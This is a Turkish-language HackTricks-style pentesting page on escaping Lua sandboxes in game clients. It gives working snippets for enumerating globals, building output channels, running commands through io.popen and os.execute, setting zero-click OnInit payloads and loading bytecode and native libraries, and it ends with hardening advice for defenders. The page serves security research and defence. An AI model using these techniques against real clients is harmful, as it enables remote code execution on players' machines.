# Lua sandbox'larını aşma (embedded VM'ler, game client'ları)

{{#include ../../../banners/hacktricks-training.md}}

Bu sayfa, uygulamalara (özellikle game client'larına, plugin'lere veya uygulama içi scripting engine'lerine) gömülü Lua "sandbox"larını enumerate etmek ve bunlardan çıkmak için pratik teknikleri bir araya getirir. Birçok engine kısıtlı bir Lua environment'ı sunar, ancak arbitrary command execution'ı veya bytecode loader'lar açığa çıktığında native memory corruption'ı mümkün kılan güçlü global'leri erişilebilir bırakır.

Temel fikirler:
- VM'yi bilinmeyen bir environment olarak ele alın: _G'yi enumerate edin ve hangi tehlikeli primitive'lere erişilebildiğini keşfedin.
- stdout/print engellendiğinde, sonuçları gözlemlemek için VM içindeki herhangi bir UI/IPC channel'ını output sink olarak kötüye kullanın.
- io/os açığa çıkmışsa genellikle doğrudan command execution elde edersiniz (io.popen, os.execute).
- load/loadstring/loadfile açığa çıkmışsa, hazırlanmış Lua bytecode'u çalıştırmak bazı sürümlerde memory safety'yi aşabilir (≤5.1 verifier'ları bypass edilebilir; 5.2 verifier'ı kaldırdı) ve gelişmiş exploitation'a olanak sağlar.

## Sandbox environment'ını enumerate etme

- Erişilebilir table/function'ların envanterini çıkarmak için global environment'ı dump edin:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- print() mevcut değilse, in-VM kanallarını yeniden kullanın. Bir MMO housing script VM'inde chat output yalnızca bir sound çağrısından sonra çalışıyordu; aşağıdaki yöntem güvenilir bir output function oluşturur:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Bu deseni hedefinize genelleyin: string kabul eden herhangi bir textbox, toast, logger veya UI callback'i reconnaissance için stdout işlevi görebilir.

## io/os expose ediliyorsa doğrudan command execution

Sandbox hâlâ io veya os standard libraries'lerini expose ediyorsa, muhtemelen anında command execution elde edersiniz:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notlar:

- Çalıştırma client process içinde gerçekleşir; harici debugger'ları engelleyen birçok anti-cheat/antidebug katmanı, in-VM process creation işlemini engelleyemez.
- Ayrıca şunları da kontrol edin: package.loadlib (arbitrary DLL/.so loading), native modules ile require, LuaJIT'in ffi'si (mevcutsa) ve debug library (VM içinde privileges yükseltebilir).

## auto-run callbacks üzerinden zero-click triggers

Host application client'lara script gönderiyorsa ve VM auto-run hooks'larını (ör. OnInit/OnLoad/OnEnter) açığa çıkarıyorsa, script yüklenir yüklenmez drive-by compromise gerçekleştirmek için payload'ınızı buraya yerleştirin:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Herhangi bir eşdeğer callback (OnLoad, OnEnter vb.), script'ler istemciye otomatik olarak iletilip çalıştırıldığında bu tekniği genelleştirir.

## Recon sırasında aranacak tehlikeli primitive'ler

_G enumeration sırasında özellikle şunları arayın:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: source veya bytecode çalıştırır; güvenilmeyen bytecode yüklemeyi destekler.
- package, package.loadlib, require: dynamic library loading ve module surface.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo ve hooks.
- LuaJIT-only: native code'u doğrudan çağırmak için ffi.cdef, ffi.load.

Ulaşılabiliyorsa minimal kullanım örnekleri:

Lua'nın loader API'si sürümler arasında değişmiştir: Lua 5.1'de `load`, bir reader function'dan okur ve `loadstring` bir string'den okur; Lua 5.2'nin `load` fonksiyonu bir string veya reader function kabul eder ve `loadstring`, eşdeğeri olarak deprecated edilmiştir.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## İsteğe bağlı escalation: Lua bytecode loaders'ı kötüye kullanma

load/loadstring/loadfile erişilebilir durumdayken io/os kısıtlanmışsa, hazırlanmış Lua bytecode'un çalıştırılması memory disclosure ve corruption primitive'lerine yol açabilir. Temel bilgiler:
- Lua ≤ 5.1, bilinen bypass'lara sahip bir bytecode verifier ile birlikte sunuluyordu.<sup>[[4]](#references)</sup>
- Lua 5.2, verifier'ı tamamen kaldırdı (resmî yaklaşım: uygulamalar yalnızca precompiled chunk'ları reddetmelidir); bu durum bytecode loading yasaklanmamışsa attack surface'i genişletir.<sup>[[2]](#references)[[3]](#references)</sup>
- İş akışları genellikle şu şekildedir: in-VM output aracılığıyla pointer'ları leak etmek, type confusion oluşturmak için bytecode hazırlamak (ör. FORLOOP veya diğer opcode'lar çevresinde), ardından arbitrary read/write veya native code execution'a pivot etmek.<sup>[[2]](#references)[[4]](#references)</sup>

Bu yol engine/version-specific'tir ve RE gerektirir. Ayrıntılı incelemeler, exploitation primitive'leri ve oyunlardaki example gadgetry için references bölümüne bakın.

## Detection and hardening notes (for defenders)

- Server side: user script'lerini reddedin veya yeniden yazın; safe API'leri allowlist'e alın; io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi'yi kaldırın veya boş bind edin.
- Client side: Lua'yı minimal bir _ENV ile çalıştırın, bytecode loading'i yasaklayın, strict bir bytecode verifier veya signature checks yeniden ekleyin ve client process'ten process creation'ı engelleyin.
- Telemetry: script load işleminden kısa süre sonra gameclient → child process creation gerçekleştiğinde alert üretin; bunu UI/chat/script event'leriyle ilişkilendirin.

## References

- [1] [Bu Ev Perili: AION client'ında on yıllık bir RCE (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Factorio'nun Lua Security Flaws'ını çözümlemek](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Bytecode verifier'ın kaldırılması üzerine tartışma](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Lua 5.1 bytecode'unu Exploit etmek (verifier bypass'ları/notları içeren gist)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Lua 5.1 Reference Manual](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Lua 5.2 Reference Manual](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
